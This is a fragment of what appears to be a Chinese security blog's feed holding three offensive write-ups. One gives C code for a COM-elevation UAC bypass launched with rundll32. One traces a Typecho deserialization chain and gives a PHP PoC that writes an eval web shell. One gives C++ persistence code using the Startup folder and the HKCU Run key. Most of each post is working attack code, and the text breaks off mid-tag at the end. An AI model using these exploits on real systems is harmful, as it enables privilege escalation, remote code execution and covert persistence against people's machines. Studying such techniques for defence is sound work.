class="line"><span class="function">HRESULT <span class="title">CoCreateInstanceAsAdmin</span><span class="params">(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BIND_OPTS3 bo;</span><br><span class="line">    WCHAR wszCLSID[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    WCHAR wszMonikerName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HRESULT hr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化COM环境</span></span><br><span class="line">    ::CoInitialize(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造字符串</span></span><br><span class="line">    ::StringFromGUID2(rclsid, wszCLSID, (<span class="keyword">sizeof</span>(wszCLSID) / <span class="keyword">sizeof</span>(wszCLSID[<span class="number">0</span>])));</span><br><span class="line">    hr = ::StringCchPrintfW(wszMonikerName, (<span class="keyword">sizeof</span>(wszMonikerName) / <span class="keyword">sizeof</span>(wszMonikerName[<span class="number">0</span>])), <span class="string">L&quot;Elevation:Administrator!new:%s&quot;</span>, wszCLSID);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> hr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置BIND_OPTS3</span></span><br><span class="line">    ::RtlZeroMemory(&amp;bo, <span class="keyword">sizeof</span>(bo));</span><br><span class="line">    bo.cbStruct = <span class="keyword">sizeof</span>(bo);</span><br><span class="line">    bo.hwnd = hWnd;</span><br><span class="line">    bo.dwClassContext = CLSCTX_LOCAL_SERVER;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建名称对象并获取COM对象</span></span><br><span class="line">    hr = ::CoGetObject(wszMonikerName, &amp;bo, riid, ppVoid);</span><br><span class="line">    <span class="keyword">return</span> hr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CMLuaUtilBypassUAC</span><span class="params">(LPWSTR lpwszExecutable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HRESULT hr = <span class="number">0</span>;</span><br><span class="line">    CLSID clsidICMLuaUtil = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    IID iidICMLuaUtil = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ICMLuaUtil* CMLuaUtil = <span class="literal">NULL</span>;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        ::CLSIDFromString(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil);</span><br><span class="line">        ::IIDFromString(IID_ICMLuaUtil, &amp;iidICMLuaUtil);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 提权</span></span><br><span class="line">        hr = CoCreateInstanceAsAdmin(<span class="literal">NULL</span>, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil));</span><br><span class="line">        <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 启动程序</span></span><br><span class="line">        hr = CMLuaUtil-&gt;lpVtbl-&gt;ShellExec(CMLuaUtil, lpwszExecutable, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, SW_SHOW);</span><br><span class="line">        <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bRet = TRUE;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放</span></span><br><span class="line">    <span class="keyword">if</span> (CMLuaUtil)</span><br><span class="line">    &#123;</span><br><span class="line">        CMLuaUtil-&gt;lpVtbl-&gt;Release(CMLuaUtil);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//导出函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> CALLBACK <span class="title">BypassUAC</span><span class="params">(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, <span class="keyword">int</span> iCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CMLuaUtilBypassUAC((LPWSTR)<span class="string">L&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用lordpe查看生成dll的导出表，发现存在导出函数</p><p><a href="https://imgtu.com/i/6ZYnVH"><img src="https://s3.ax1x.com/2021/03/04/6ZYnVH.png" alt="6ZYnVH.png"></a></p><p>用rundll32.exe调用导出函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 ComBypassUACdll.dll,BypassUAC</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/6ZYeqe"><img src="https://s3.ax1x.com/2021/03/04/6ZYeqe.png" alt="6ZYeqe.png"></a></p><p>BypassUAC成功</p><p><a href="https://imgtu.com/i/6ZYuad"><img src="https://s3.ax1x.com/2021/03/04/6ZYuad.png" alt="6ZYuad.png"></a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>typecho反序列化分析</title>
    <link href="/2021/03/03/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <url>/2021/03/03/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>1.install.php</p><p>install.php中存在unserialize函数，__typecho_config可控。值被作为参数传入类Typecho_Db</p><p><a href="https://imgbed.cn/preview?id=603f366b28110700016f75f6"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8d5d50a3-2fe6-4c8c-baaf-fabd0b3a1869.png" alt="imgbed.cn图床"></a></p><p>2./var/Typecho/Cookie.php</p><p>Typecho_Cookie::get方法从Cookie或者是POST数组中获取数据</p><p><a href="https://imgbed.cn/preview?id=603f36733cfcc50001576f61"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/e5924563-8b86-4d61-8ddc-bb46aaeea102.png" alt="imgbed.cn图床"></a></p><p>3./var/Typecho/Db.php</p><p>跟进类Typecho_Db,传入的参数被作为字符串拼接，触发__toString()，全局搜索toString</p><p><a href="https://imgbed.cn/preview?id=603f394ae9788300015e11ee"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/5eed6331-803d-4ef0-a608-5c6e74f41a63.png" alt="imgbed.cn图床"></a></p><p>4./var/Typecho/Feed.php中存在可利用toString方法</p><p>满足条件self::RSS2 == $this-&gt;_type执行下面的语句，如果$item[‘author’]是一个类，就会触发__get()方法，开始全局搜索get方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> .= <span class="string">&#x27;&lt;dc:creator&gt;&#x27;</span> . htmlspecialchars(<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="built_in">self</span>::EOL;</span><br></pre></td></tr></table></figure><p><a href="https://imgbed.cn/preview?id=603f36877c46e800014fad42"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/02dedb11-1de4-4f60-9e43-b412f42870e7.png" alt="imgbed.cn图床"></a></p><p>5./var/Typecho/request.php</p><p>request.php中Typecho_Request类存在__get()方法，<code>__get</code>()含有一个参数，即要获取的成员属性的名称，$key=’screenName’</p><p><a href="https://imgbed.cn/preview?id=603f369b2ff44a0001828d25"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/03339ab0-a0e5-4f54-83b5-f3dde2d3489b.png" alt="imgbed.cn图床"></a></p><p>6.跟进get方法</p><p><a href="https://imgbed.cn/preview?id=603f36ae91df94000121437f"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/abc5d750-4cf6-444c-a8d2-64f33fd5f834.png" alt="imgbed.cn图床"></a></p><p>6.跟进<code>_applyFilter</code>方法，发现call_user_func函数，到达终点。filter属性为要执行的函数，$value来源为传入参数，在get函数中被<code>$value = $this-&gt;_params[$key]</code>赋值，来源于属性_params。<code>$this-&gt;_params[$key]</code>等于<code>$this-&gt;_params[&#39;screenName&#39;]</code></p><p><a href="https://imgbed.cn/preview?id=603f36ba6df2d3000109c02c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/4f2c37c1-923d-4950-83c4-b4592fd71c4a.png" alt="imgbed.cn图床"></a></p><h2 id="构造利用链"><a href="#构造利用链" class="headerlink" title="构造利用链"></a>构造利用链</h2><p>令Typecho_Db类中的$adapterName=$config[‘adapter’]等于Feed.php中的Typecho_Feed类，创建一个数组$a=array(‘adapter’ =&gt;new Typecho_Feed(),’prefix’ =&gt; ‘typecho_’)</p><p>令Typecho_Feed类中的$item[‘author’]等于Typecho_Request类</p><p>令Typecho_Request类中的属性<code>_params=array(&#39;screenName&#39;=&gt;&#39;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\$_POST[\&#39;a\&#39;]); ?&gt;&quot;)&#39;)</code></p><p>令Typecho_Request类中的属性_filter=array(‘assert’)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\$_POST[\&#x27;a\&#x27;]); ?&gt;&quot;)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> RSS2 = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_items</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type=<span class="built_in">self</span>::RSS2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>]=<span class="keyword">array</span>(<span class="string">&#x27;author&#x27;</span>=&gt;<span class="keyword">new</span> Typecho_Request());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;adapter&#x27;</span> =&gt;<span class="keyword">new</span> Typecho_Feed(),<span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;typecho_&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>install.php中要求触发反序列化需要满足两个条件</p><p>必须有GET参数finish</p><p>Refer必须为本站链接，如<a href="http://127.0.0.1/typecho">http://127.0.0.1/typecho</a></p><p><a href="https://imgbed.cn/preview?id=603f36c61b484900018f385a"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/736ce55e-b9e8-4ac4-81ad-822f44a1be51.png" alt="imgbed.cn图床"></a></p><h2 id="利用结果"><a href="#利用结果" class="headerlink" title="利用结果"></a>利用结果</h2><p><a href="https://imgbed.cn/preview?id=603f36cf91df9400012143b4"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/4870195c-db40-4b0c-b73b-2511d30812bf.png" alt="imgbed.cn图床"></a></p><p>写入成功</p><p><a href="https://imgbed.cn/preview?id=603f36ddb3108e0001913085"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8acf0548-facf-40cd-ae80-c616e44c718c.png" alt="imgbed.cn图床"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>通过添加启动目录和和修改注册表进行权限维持</title>
    <link href="/2021/03/01/%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95%E5%92%8C%E5%92%8C%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <url>/2021/03/01/%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95%E5%92%8C%E5%92%8C%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h1 id="添加启动目录"><a href="#添加启动目录" class="headerlink" title="添加启动目录"></a>添加启动目录</h1><p>由于启动目录不固定，需要先通过SHGetSpecialFolderPath获取启动路径，再CopyFile把要自启动的程序复制过去</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;shlobj_core.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">wchar_t</span> StartupFolder[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">wchar_t</span> Path[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">BOOL bRet= SHGetSpecialFolderPath(<span class="literal">NULL</span>, StartupFolder, CSIDL_STARTUP, FALSE);</span><br><span class="line"><span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GetModuleFileName(<span class="literal">NULL</span>, (LPWSTR)&amp;Path, MAX_PATH);</span><br><span class="line">wcscat_s(StartupFolder, <span class="string">L&quot;\\Persistance.exe&quot;</span>);</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, StartupFolder, <span class="string">L&quot;StartupFolder&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">if</span> (CopyFile(Path, StartupFolder, FALSE)) &#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;succeed&quot;</span>, <span class="string">L&quot;succeed&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="修改注册表"><a href="#修改注册表" class="headerlink" title="修改注册表"></a>修改注册表</h1><p>无需管理员权限即可修改HKEY_CURRENT_USER</p><p>在HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run中写入程序路径即可实现开机自启动</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//添加自身到注册表启动项</span></span><br><span class="line"><span class="function">BOOL <span class="title">Regpersist</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HKEY hKey;</span><br><span class="line">LPCTSTR szRun = _T(<span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (RegOpenKeyEx(HKEY_CURRENT_USER, szRun, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hKey)</span><br><span class="line">== ERROR_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line">TCHAR szFileName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwRet = GetModuleFileName(<span class="literal">NULL</span>, szFileName, MAX_PATH);</span><br><span class="line">AfxMessageBox(szFileName);</span><br><span class="line"><span class="keyword">long</span> lRet = RegSetValueEx(hKey, _T(<span class="string">&quot;Login&quot;</span>), <span class="number">0</span>, REG_SZ, (BYTE*)szFileName, dwRet);</span><br><span class="line">RegCloseKey(hKey);</span><br><span class="line"><span class="keyword">if</span> (lRet != ERROR_SUCCESS)</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//else// 删除启动;</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//long lRet = RegDeleteValue(hKey, &quot;MFCLogin&quot;);</span></span><br><span class="line"><span class="comment">//RegCloseKey(hKey);</span></span><br><span class="line"><span class="comment">//if (lRet != ERROR_SUCCESS)</span></span><br><span class="line"><span class="comment">//return FALSE;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(_T(<span class="string">&quot;打开注册表失败&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">MessageBox(_T(<span class="string">&quot;添加成功&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h1><h2 id="SHGetSpecialFolderPath"><a href="#SHGetSpecialFolderPath" class="headerlink" title="SHGetSpecialFolderPath"></a>SHGetSpecialFolderPath</h2><p>该api用来获取指定的系统路径 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SHGetSpecialFolderPathA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HWND  hwnd,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR pszPath,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>   csidl, <span class="comment">//CSIDL_STARTUP</span></span></span></span><br><span class="line"><span class="function"><span class="params">  BOOL  fCreate</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="RegOpenKey"><a href="#RegOpenKey" class="headerlink" title="RegOpenKey"></a>RegOpenKey</h2><p>打开注册表，成功返回ERROR_SUCCESS</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegOpenKeyA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY   hKey,   <span class="comment">//指定一个父键句柄  HKEY_CURRENT_USER </span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpSubKey,<span class="comment">//指向一个字符串，表示要打开的子键名称,_T(&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;)</span></span></span></span><br><span class="line"><span class="function"><span class="params">  PHKEY  phkResult<span class="comment">//返回打开的子键句柄 &amp;hKey</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="RegCloseKey"><a href="#RegCloseKey" class="headerlink" title="RegCloseKey"></a>RegCloseKey</h2><p>关闭注册表，成功返回ERROR_SUCCESS</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegCloseKey</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY hKey<span class="comment">//打开的子键句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="RegQueryValueEx"><a href="#RegQueryValueEx" class="headerlink" title="RegQueryValueEx"></a>RegQueryValueEx</h2><p>注册表键值的查询</p><p>成功返回  ERROR_SUCCESS.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegQueryValueExA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY    hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpValueName,<span class="comment">//指定要被查询的键值的名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpReserved,<span class="comment">//保留，始终NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpType,<span class="comment">//返回被查询的值的类型</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  lpData,<span class="comment">//返回被查询数据的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpcbData<span class="comment">//缓冲区长度</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="RegSetValueEx"><a href="#RegSetValueEx" class="headerlink" title="RegSetValueEx"></a>RegSetValueEx</h2><p>注册表键值的写入</p><p>成功返回  ERROR_SUCCESS.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegSetValueExA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY       hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄 HKEY_LOCAL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR     lpValueName,<span class="comment">//指定要被查询或写入的键值的名称 MFCLogin</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      Reserved,<span class="comment">//保留，始终为0   0</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      dwType,<span class="comment">//写入键值的类型   REG_SZ</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> BYTE *lpData,<span class="comment">//写入键值的缓冲区   路径</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD      cbData<span class="comment">//写入键值缓冲区的长度    sizeof</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="RegEnumValue"><a href="#RegEnumValue" class="headerlink" title="RegEnumValue"></a>RegEnumValue</h2><p>注册表键值的枚举</p><p>成功返回  ERROR_SUCCESS.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegEnumValueA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY    hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   dwIndex,<span class="comment">//查询的索引值</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR   lpValueName,<span class="comment">//健名的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpcchValueName,<span class="comment">//健名缓冲区的长度</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpReserved,<span class="comment">//保留，NULL</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpType,<span class="comment">//返回被查询的值的类型</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  lpData,<span class="comment">//被查询键值的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpcbData<span class="comment">//被查询键值的缓冲区的大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="RegDeleteValue"><a href="#RegDeleteValue" class="headerlink" title="RegDeleteValue"></a>RegDeleteValue</h2><p>注册表键值的删除</p><p>成功返回  ERROR_SUCCESS.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LSTATUS <span class="title">RegDeleteValueA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HKEY   hKey,<span class="comment">//指向一个已经被打开或创建的子键句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR lpValueName<span class="comment">//指向欲删除的键值项的名称</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="GetModuleFileName"><a href="#GetModuleFileName" class="headerlink" title="GetModuleFileName"></a>GetModuleFileName</h2><p>在开发过程中经常需要获得程序当前的运行目录，这时就可以使用GetModuleFileName</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">GetModuleFileName</span><span 